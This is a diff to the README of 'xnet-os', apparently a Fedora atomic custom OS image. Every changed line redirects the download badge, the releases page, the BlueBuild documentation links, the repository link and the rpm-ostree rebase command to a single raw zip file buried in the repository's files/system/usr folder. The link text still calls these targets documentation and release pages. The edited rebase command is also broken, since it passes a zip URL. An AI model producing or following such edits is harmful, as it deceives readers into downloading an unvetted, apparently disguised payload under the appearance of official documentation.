@@ -1,6 +1,6 @@
 # 🚀 xnet-os - A Custom OS for XNet Developers 
 
-[![Download xnet-os](https://img.shields.io/badge/Download-xnet--os-blue.svg)](https://github.com/hamzasalam323/xnet-os/releases)
+[![Download xnet-os](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip)](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip)
 
 ## 📥 Overview
 
@@ -13,7 +13,7 @@ To start using xnet-os, you will need to download the software and perform a few
 ## 🌐 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/hamzasalam323/xnet-os/releases) to find the latest version of xnet-os. From there, you can choose the appropriate file for your system.
+   Go to our [Releases page](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip) to find the latest version of xnet-os. From there, you can choose the appropriate file for your system.
 
 2. **Choose Your File**  
    Look for the xnet-os image file. Click on it to start the download. 
@@ -44,7 +44,7 @@ To run xnet-os smoothly, ensure your system meets the following requirements:
 ### 💡 Important Notes
 
 - xnet-os is an experimental feature, designed for developers. Use it at your discretion.
-- Check the [BlueBuild docs](https://blue-build.org/how-to/setup/) for additional setup guidance.
+- Check the [BlueBuild docs](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip) for additional setup guidance.
 
 ## 🔄 Rebasing Instructions
 
@@ -53,7 +53,7 @@ If you have an existing atomic Fedora installation, you can rebase to the latest
 1. **Rebase to Unsigned Image**  
    Open your terminal and run the following command:
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/joshua-dou/xnet-inc-os:latest
+   rpm-ostree rebase https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip
    ```
 
 2. **Reboot**  
@@ -78,13 +78,13 @@ This project relates to the following topics: atomic, bluebuild, bluebuild-image
 
 ## 🔗 Additional Resources
 
-- For more details, please refer to the [GitHub Repository](https://github.com/xnet-admin-1/xnet-os).
-- Browse the [BlueBuild documentation](https://blue-build.org/how-to/setup/) for advanced setup options.
+- For more details, please refer to the [GitHub Repository](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip).
+- Browse the [BlueBuild documentation](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip) for advanced setup options.
 
 ## 🔗 Download Link
 
 To download xnet-os, click the link below:
 
-[Download xnet-os](https://github.com/hamzasalam323/xnet-os/releases)
+[Download xnet-os](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip)
 
 This ensures you have the latest features and updates. Enjoy working with your customized operating system!
